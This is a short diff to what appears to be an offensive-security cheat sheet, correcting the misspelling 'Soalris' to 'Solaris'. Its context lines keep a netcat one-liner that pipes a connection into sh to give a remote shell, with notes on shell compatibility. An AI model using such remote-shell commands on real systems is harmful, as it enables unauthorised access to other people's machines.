@@ -1173,7 +1173,7 @@ Variant if *'-e'* is not supported:
 ```
 
 * On modern shells this can be shortened to `{ nc -v 127.0.0.1 31337 </dev/fd/2|sh;} 2>&1|:`. (*thanks IA_PD*).  
-* The `| :` trick wont work on C-Shell/tcsh (FreeBSD), orignal Bourne shell (Soalris) or Korn shell (AIX). Use `mkfifo` instead.
+* The `| :` trick wont work on C-Shell/tcsh (FreeBSD), orignal Bourne shell (Solaris) or Korn shell (AIX). Use `mkfifo` instead.
 
 Variant for older */bin/sh*:
 ```sh
